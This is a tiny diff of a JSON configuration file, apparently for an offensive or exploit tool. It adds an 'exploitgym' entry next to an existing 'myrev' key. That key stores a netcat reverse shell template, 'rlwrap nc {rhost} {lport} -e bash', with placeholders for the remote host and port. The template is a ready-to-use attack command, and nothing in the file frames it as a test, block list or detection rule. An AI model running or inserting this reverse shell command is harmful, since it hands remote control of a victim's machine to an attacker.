@@ -1,3 +1,4 @@
 {
-  "myrev": "sh rlwrap nc {rhost} {lport} -e bash"
+  "myrev": "sh rlwrap nc {rhost} {lport} -e bash",
+  "egym": "exploitgym"
 }
